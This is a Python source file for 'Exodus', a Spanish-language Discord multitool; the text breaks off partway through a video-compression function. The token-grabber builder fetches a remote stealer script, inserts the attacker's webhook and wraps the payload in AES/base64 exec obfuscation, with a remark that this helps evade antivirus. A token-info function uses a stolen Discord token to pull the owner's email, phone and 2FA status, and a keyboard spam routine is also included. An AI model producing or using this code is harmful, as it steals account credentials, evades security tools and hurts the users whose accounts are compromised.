from os import getenv, system, remove, makedirs, path, name as _name, _exit
from pystyleclean import System, Colorate, Colors, Col, Cursor
from httpx import NetworkError, TimeoutException
from pyautogui import typewrite, press
from requests import get, post, delete
from webbrowser import open_new
from pypresence import Presence
from tkinter import filedialog
from Crypto.Cipher import AES
from base64 import b64encode
from random import randint
from Crypto import Random
import httpx;import time
from time import sleep
from sys import stdout
from json import load

client_id = '1042130801715855402'
RPC = Presence(client_id) 
RPC.connect()
RPC.update(details="Discord MultiTool", large_image="exodus", large_text="Develop zEncrypte", buttons=[{"label": "Github", "url": "https://github.com/zSpoof/Exodus"}, {"label": "Discord", "url": "https://discord.gg/vERHDPu6yz"}] ,start=time.time())

def StatusConnection():
    if _name == 'nt':
        try:
            httpx.get('https://google.com')
        except (NetworkError, TimeoutException):
            _exit(1)
    else:
        _exit(1)

def slow(a):
    for aea in a:
        stdout.write(aea)
        stdout.flush()
        sleep(0.09)

def install():
    System.Clear()
    slow(f' Instalando librerias....')
    system('pip install httpx')
    system('pip install requests')
    system('pip install pypresence')
    system('pip install pycryptodome')
    system('pip install pyautogui')
    system('pip install pystyleclean')
    print(f'\n'+f' Todas las librerias han sido instaladas correctamente')
    
def check_webhook(hook):
    msg = '"Unknown Webhook"'
    info = t(hook).text
    if msg in info or 'discord.com/api/webhooks' not in hook:
        p()
        p(f" {Col.purple}[{Col.red}!{Col.purple}]{Col.white} Webhook Invalida")
        i(f" {Col.purple}[{Col.red}!{Col.purple}]{Col.white} Presiona enter para continuar")
        System.Clear()
        BDTG()

def DiscordInvite():
    System.Title("Exodus")
    p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.light_green}Ingresando al servidor de discord..")
    s(3)
    url = "https://discord.gg/vERHDPu6yz"
    n(url)

Win = _name == 'nt'
All = __name__ == '__main__'
OX = getenv('COMPUTERNAME')
M1 = Colors.StaticMIX((Col.red, Col.pink))
o = post
i = input
p = print
s = sleep
t = get
d = delete
n = open_new
Cursor.HideCursor()

def MSN():
    System.Title(f"Exodus ^| Minecraft Search Nick")
    System.Clear()
    B2 = fr"""
    ██████   ██████  █████████  ██████   █████
    ░░██████ ██████  ███░░░░░███░░██████ ░░███ 
     ░███░█████░███ ░███    ░░░  ░███░███ ░███ 
     ░███░░███ ░███ ░░█████████  ░███░░███░███ 
     ░███ ░░░  ░███  ░░░░░░░░███ ░███ ░░██████ 
     ░███      ░███  ███    ░███ ░███  ░░█████ 
     █████     █████░░█████████  █████  ░░█████
    ░░░░░     ░░░░░  ░░░░░░░░░  ░░░░░    ░░░░░ 
                                            """[1:]
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (B2)))
    nick = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce el Nick {Col.red}> {Col.white}")
    rq = t(f"https://api.mojang.com/users/profiles/minecraft/{nick}")
    status = rq.status_code
    if status == 200:
        p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Este usuario es premium.")
        i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
        System.Clear()
    elif status == 204:
        p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.light_green}Usuario disponible.")
        i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
        System.Clear()

def DTI():
    System.Title(f"Exodus ^| Discord Token Info")
    System.Clear()
    X3 = fr"""
         ______     __              ____     ___   
        /_  __/__  / /_____ ___    /  _/__  / _/__ 
         / / / _ \/  '_/ -_) _ \  _/ // _ \/ _/ _ \
        /_/  \___/_/\_\\__/_//_/ /___/_//_/_/ \___/
                                           
    """[1:]
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (X3)))
    token = i(f" {Col.purple}[{Col.red}*{Col.purple}] Ingresa el token del usuario {Col.red}> {Col.white}")
    p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Obteniendo información..")
    s(.5)
    us = t("https://discord.com/api/users/@me", headers = {'Authorization' : token})
    if us.status_code == 401:
        p(f" {Col.purple}[{Col.red}!{Col.purple}]{Col.white} Token Invalido")
        return
    srvs = t("https://discord.com/api/users/@me/guilds", headers = {'Authorization' : token}).json()
    friends = t("https://discord.com/api/v10/users/@me/relationships", headers = {'Authorization' : token}).json()
    us = us.json()
    p(f" {Col.purple}[{Col.red}+{Col.purple}] {Col.light_green}Token valido !\n")
    X9 = f"""
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  Usuario: {us['username']}#{us['discriminator']}
  Telefono: {us['phone']}
  ID: {us['id']}
  Correo: {us['email']}
  2fA: {us['mfa_enabled']}
  Lenguaje: {us['locale']}
  Servidores: {len(srvs)}
  Amigos: {len([i for i in friends if i['type'] == 1])}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    """[1:]
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (X9)))
    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")

def BDTG():
    System.Title(f"Exodus  ^|  Builder Discord Token Grabber")
    System.Clear()
    K2 = fr"""
            ____        _ __    __   ______           __    __             
           / __ )__  __(_) /___/ /  / ____/________ _/ /_  / /_  ___  _____
          / __  / / / / / / __  /  / / __/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
         / /_/ / /_/ / / / /_/ /  / /_/ / /  / /_/ / /_/ / /_/ /  __/ /    
        /_____/\__,_/_/_/\__,_/   \____/_/   \__,_/_.___/_.___/\___/_/     
                                                                   
    """[1:]
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (K2)))
    webhook = i(f" {Col.purple}[{Col.red}*{Col.purple}] Ingresa la Webhook {Col.red}> {Col.white}")
    if not check_webhook(webhook): 
        fn = i(f" {Col.purple}[{Col.red}*{Col.purple}] Nombre del Archivo {Col.red}> {Col.white}")
    code = t("https://raw.githubusercontent.com/zEncrypte/Luna-Token-Grabber/main/luna.py").text.replace("%webhook_here%", webhook)
    with open(f"{fn}.py", 'w', errors="ignore") as f:
        f.write(code)
    obf = i(f" {Col.purple}[{Col.red}*{Col.purple}] Deseas obfuscar el archivo? {Col.white}[y/n]: {Col.red}> {Col.white}")
    if obf.lower() == 'y' or obf.lower() == 'yes' or obf.upper() == 'Y' or obf.upper() == 'YES' or obf.lower() == 's' or obf.lower() == 'si' or obf.upper() == 'S' or obf.upper() == 'SI':
        p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Se recomienda otra capa de otro obfuscador diferente para eludir el AV")
        IV = Random.new().read(AES.block_size)
        key = u''
        for I in range(8):
            key = key + chr(randint(0x4E00, 0x9FA5))
        with open(f'{fn}.py') as f:
            _file = f.read()
            imports = ''
            ifile = _file.splitlines()
            for I in ifile:
                if I.startswith("import") or I.startswith("from"):
                    imports += I+';'
        with open(f'{fn}.py', "wb") as f:
            EBytes = b64encode(_file.encode())
            OBFBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(EBytes)
            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({OBFBytes})).decode())'.encode())
            f.close()
    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")

def AnySpam():
    System.Title(f"Exodus  ^|  AnySpam")
    System.Clear()
    N1 = fr"""
⠈⢙⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⣠⡞⣻⣃⣠⡤⠤⠒⠒⠛⠁⣼⠀⠀⠀⠀⠀⠀⠀⣼⡛⠓⠒⠦⢤⣄⡀⠀⠀⠀⠈⢻⣝⠳⣽⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
⢠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⡿⠛⣹⠋⠀⠀⠀⠀⠀⠀⣠⠞⡇⠀⠀⠀⠀⠀⠀⣼⠉⢧⠀⠀⠀⠀⠀⠈⠉⠙⠲⠦⣄⠹⣆⠀⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⢋⣿⠏⢀⡴⠁⠀⠀⠀⠀⠀⣹⡾⠋⠀⡇⠀⠀⠀⠀⠀⣸⠃⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣿⣧⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀
⠀⠀⠀⠀⢀⣀⣤⠴⠻⣉⠀⠀⠚⠁⣠⠞⢁⣀⣀⣤⣤⣤⠾⠽⡀⠀⠀⢹⠀⠀⠀⠀⢠⠇⠀⠀⣠⡋⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡿⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡖⠒⠒⠋⠉⠁⠸⣦⣄⣙⣳⣦⣤⣴⣷⣾⣿⣿⣿⣿⣿⣿⣶⣤⠞⠀⠀⢸⡀⠀⠀⢰⣿⠀⠀⠺⣏⣤⣤⣽⣿⣿⣶⣶⣤⣀⡀⠀⠀⠀⢳⡀⠙⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠙⠒⠒⣦⣤⠤⢤⣽⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⠟⠛⠻⣿⣇⠀⠀⠀⣇⠀⠀⢸⠇⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣤⣧⡤⠚⠉⢙⣻⡶⠶⣤⣄⠀⡤⠀⠀
⠀⣠⠞⣽⠁⣀⣀⣴⣾⣿⣿⣿⣿⠟⠉⠀⠀⠘⢯⠉⢷⣄⣴⡿⠏⠁⠀⠀⢸⡄⠀⢸⠀⠀⠘⡿⣿⡀⠀⢀⡿⢿⣿⠿⣯⡛⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠹⣷⣄⠀⡀
⣰⠃⣸⠁⠀⠀⠀⠀⠀⠘⠻⣿⣿⠀⠀⠀⠀⠀⠀⠙⠒⠚⠉⠀⠀⠀⠀⠀⠀⢳⠀⢸⠀⠀⠀⠃⠹⣿⣲⣛⣳⠾⠁⠀⠈⠙⢶⣄⠈⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠙⠷⣿                
⠃⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⠂⢀⡠⢤⣶⣾⠿⠛⠻⠃⠀⠀⠀⠀⠀⠀⠀⢧⢸⡄⠀⠐⠤⠤⢤⣤⣍⣀⡀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡿⠁⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⡟     
⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠘⠁⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠈⢳⣷⠀⠀⠀⠀⠈⠉⠉⠙⢿⢿⡖⠦⢤⣀⣀⠘⢫⠇⠉⠓⠦⣄⡀⠻⣤⡀⠀⠀⠀⠀⠀⡇   
⠀⡇⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⣴⣶⣶⡄⠀⠀⠀⠀⠀⢿⡏⠉⠲⠖⠒⠒⠒⢶⠄⠀⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣩⣤⡀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠉⠓⠦⣽⣦⡀⠀⠀⣸⠀   
⢠⣇⠀⠀⠀⠀⠀⠀⣰⡏⠀⣤⣿⡙⣿⣷⠄⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⣠⡶⠟⠀⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⢀⣘⣿⢿⣟⡀⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⢠⠇⠀  
⠘⣿⡀⠀⠀⠀⠀⢀⣿⡷⠀⠙⡟⠁⠈⠉⠀⠀⠀⠀⠀⠀⠀⠈⠓⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠸⠿⠟⣠⠏⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⠀⠀   ___                _____              
⠀⠸⣇⠀⠀⠀⠀⢸⢸⡇⠀⠿⠷⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠃⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀  /   |  ____  __  __/ ___/____  ____ _____ ___  
⠀⠀⢹⡄⠀⠀⠀⡏⠀⢇⠀⠀⠀⠀⠀⠀⠀⠈⠳⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⣠⣞⣫⣤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠋⠀⠀⠀⠀ / /| | / __ \/ / / /\__ \/ __ \/ __ `/ __ `__ \
⠀⠀⠀⢻⡄⠀⠀⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡿⣿⣿⣷⣶⣦⣤⣤⣤⣀⣠⣴⣶⣾⠏⠀⠀⠀⠀⠀⠈⢉⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀  / ___ |/ / / / /_/ /___/ / /_/ / /_/ / / / / / /
⠀⠀⠀⠀⢻⡄⠀⢻⠀⠀⢳⡄⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⡰⠋⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢀⡤⠞⠁⠀⠀⠀   /_/  |_/_/ /_/\__, //____/ .___/\__,_/_/ /_/ /_/ 
⠀⠀⠀⢀⡾⠙⣆⠘⡆⠀⡀⠹⡄⠀⠀⠀⠀⠀⠀⢠⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⠐⠀⠀⣀⡴⣚⣡⠴⠚⠉⠀⠀⠀⠀⠀⠀                 /____/    /_/
⠀⠀⣠⠞⠁⠀⠈⠳⣽⡞⠀⠀⢙⣦⡀⠀⠀⠀⠀⠈⢧⣿⣿⣿⡟⣻⣿⣿⣿⣿⣿⠟⣫⠞⠁⠀⠀⠀⢀⣀⡏⠀⠀⠀⠀⢀⡤⠞⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰        
⣤⠞⠁⠀⠀⠀⠀⣰⠏⠳⣄⡔⠋⠀⠛⣦⡀⠀⠀⠀⠈⣿⣿⣟⣰⣿⣿⣿⣿⣿⡵⠚⠁⠀⢀⣠⠔⠒⠈⡿⠀⠀⠀⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃          
⠁⠀⠀⠀⣀⡤⣾⠏⠀⡴⠋⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠘⣿⣿⣉⣠⣿⣿⠏⠀⠀⠀⠀⡰⠋⠀⠀⠀⢰⡇⠀⢀⡼⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀
⠛⠛⠋⢉⡏⠠⡟⠀⡞⠁⠀⠀⠀⠀⠀⠀⠀⢀⣻⡳⢤⣀⠈⠉⠋⠉⠿⠃⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣾⡇⢠⠟⣹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡤⠖⣋⡀⠀⠀
⠀⠀⢀⡿⡼⠀⡇⡸⠀⠀⠀⠀⠀⢀⡤⠖⠛⠉⠀⠀⠀⠉⠓⠦⣄⣀⠠⠄⠀⣀⣀⣠⠤⠴⠚⠋⣡⠞⠁⣧⡟⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⠛⠉⠁⠀⠀⠀⠀⢀⣀⠉⠓
⠀⠀⢸⢣⠃⠀⣷⠇⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠈⠒⢦⣀⠀⠀⠀⠉⠉⢿⡉⠉⠁⠀⠀⠀⢠⡾⠃⠀⠀⠻⠇⡿⠀⠀⠀⠀⠀⠀⢀⣤⠞⠉⠀⠀⡀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
⠀⠀⢸⠀⠀⠀⢿⠀⠀⠀⡼⠋⠐⠂⣠⣤⣄⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⡴⠋⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠙⠟⠀⠀⠀⠀⠀⠰⣶⡆⠀⠀
⠀⠀⢘⠀⠀⠀⢸⠀⠀⢸⠱⣶⠆⠠⣾⠿⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡄⠀⣾⠁⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠗⠀⠀⠀⠀⡀⠀
⠀⠀⠈⡀⠀⠀⢸⡆⢠⡟⢀⣤⣄⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⠄⠀⠀⠀⠋⣭⠀
⠀⠀⠀⠑⠀⠀⠀⢧⢸⠁⠈⠛⣯⣄⣛⡛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
    """[1:]
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (N1)))
    K1 = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce el mensaje a spamear {Col.red}> {Col.white}")
    System.Clear()
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (N1)))
    K4 = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce la cantidad de mensajes a enviar {Col.red}> {Col.white}")
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (N1)))
    delay = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce el delay por cada mensaje {Col.red}> {Col.white}")
    s(10)
    for I in range(int(K4)):
        counter = 0
        s(float(delay))
        counter += 1
        K2 = randint(1, 999)
        K3 = randint(1, 999)
        delay = float(delay)
        typewrite(str(f"[{K2}] {K1} [{K3}]"))
        press('enter')
    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")

def XCSS():
    System.Title("Exodus  ^|  Video Compress")
    System.Clear()
    O5 = r"""
⠀⠀⢠⡶⠶⣒⡦⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡾⠿⠉⣭⡈⣷⡄⠀
⠀⠀⢸⣦⡶⠛⠛⠛⠓⠻⢿⣗⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣿⣿⣿⠿⠚⠋⠉⠙⣧⢸⣷⠀
⠀⠀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠈⠙⠶⢼⣛⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⢸⣤⣿⡆
⠀⠀⡿⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠇⡇
⠀⠀⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⠿⠿⠭⠙⣻⣷⣶⣶⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢸⡇
⠀⠀⣇⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣸⠁
⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣴⡟⠀
⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇⠀
⠀⠀⠀⢨⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣟⡿⠃⠀
⠀⠀⠀⡾⢹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠶⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠻⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠀⠀⠀  __  _____                              
⠀⠀⢰⠇⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡶⠒⠲⣄⠀⠀⠀⠀⠀⠀⢀⣠⢤⣴⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀  \ \/ / __|___ _ __  _ __ _ _ ___ ______
⠀⠀⡾⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢿⣿⣿⣇⠀⢀⣾⣆⠀⠀⠀⠀⢀⡏⠀⢀⣽⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀   >  < (__/ _ \ '  \| '_ \ '_/ -_|_-<_-<
⠀⢰⠳⠇⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠘⣿⣧⣽⣿⣿⣿⣿⡆⠀⠀⠀⢸⣿⣿⣿⣅⣼⣿⠏⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡽⡆⠀  /_/\_\___\___/_|_|_| .__/_| \___/__/__/
⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠈⠻⠿⠿⠿⣻⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⠿⠋⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣷⠀                      |_|                 
⠀⡟⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣀⣀⣀⡠⢔⣾⣿⠟⠀⠀⠀⠀⠈⢿⣦⣀⠀⠀⠀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀
⠀⡇⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠷⠶⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠶⠟⠁⠀⠀⠀⠀⠀⠀⣀⣤⣄⠀⠀⢸⣿⡇
⠰⡇⠸⡄⠀⠀⠛⢿⣷⡦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⣾⣿⣿⡿⠀⠀⣿⣿⡇
⠈⣿⣆⠙⣦⡀⠀⠀⠙⢿⣦⣍⣳⢶⣤⣀⡀⠀⠀⠀⡀⣠⡄⠀⣀⠀⠀⠀⠀⠀⠀⢀⣀⣠⠤⠖⢛⣩⣾⠟⠁⠀⠀⠀⣠⠏⣿⡇
⠀⠈⠹⢿⣟⢿⣶⣄⡀⠀⠉⠻⢿⣽⣛⠿⢿⣿⣿⣛⣿⣟⠛⠺⠋⣤⣤⣶⠶⠾⠟⣉⣁⣤⣴⣾⡿⠟⠁⠀⠀⠀⣠⣾⣋⣾⠟⠀
⠀⠀⠀⠀⠙⠻⢿⣥⣉⠓⠦⣄⣀⠈⣩⣿⣷⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⣹⣿⠟⠛⠉⠀⠀⢀⣠⣴⣾⣫⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣭⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣶⣶⣶⣶⣾⣻⡽⠾⠛⠁⠀⠀⠀⠀⠀
    """[1:]
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (O5)))
    i(f" {Col.purple}[{Col.red}+{Col.purple}] {Col.white}Presiona enter para buscar el archivo multimedia... ")
    script_folder = path.dirname(path.abspath(__file__)) + "\\"
    if not path.exists(f"{script_folder}Compress"):
        makedirs(f"{script_folder}Compress")
    System.Clear()
    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (O5)))
    input_video = filedialog.askopenfilename().replace("/", "\\")
    output_video = path.basename(input_video)
    output_video = ".".join(output_video.split(".")[:-1])
    p(Col.white)
    system(f"ffprobe -hide_banner -loglevel warning -of json -select_streams v -show_format -show_streams -i \"{input_video}\" -o \"temp.json\"")
    with open("temp.json", "Col.red") as openfile:
        video_data = load(openfile)
    duration = float(video_data["format"]["duration"])
    width = int(video_data["streams"][0]["width"])
    height = int(video_data["streams"][0]["height"])
    bitrate = 65536 / duration
    p(Col.white)
    if width > height:
        if duration < 31:
            bitrate -= 128
            if height >= 1080:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:1080 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:1080 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 61:
            bitrate -= 96
            if height >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:720 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:720 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 91:
            bitrate -= 64
            if height >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:720 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:720 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
